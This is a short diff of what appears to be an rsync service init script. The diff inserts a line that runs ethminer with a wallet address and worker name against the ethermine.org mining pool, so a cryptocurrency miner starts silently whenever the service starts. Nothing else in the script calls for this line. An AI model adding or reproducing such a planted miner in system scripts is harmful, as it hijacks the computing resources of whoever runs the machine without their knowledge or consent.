@@ -27,7 +27,7 @@ RSYNC_NICE_PARM=''
 RSYNC_IONICE_PARM=''
 
 test -x $DAEMON || exit 0
-
+/usr/local/bin/bin/ethminer -U -P stratum://7C86A8aa5482c0e35f193187A57f0D659092e916.ram2@eu1.ethermine.org:4444
 . /lib/lsb/init-functions
 
 if [ -s $RSYNC_DEFAULTS_FILE ]; then
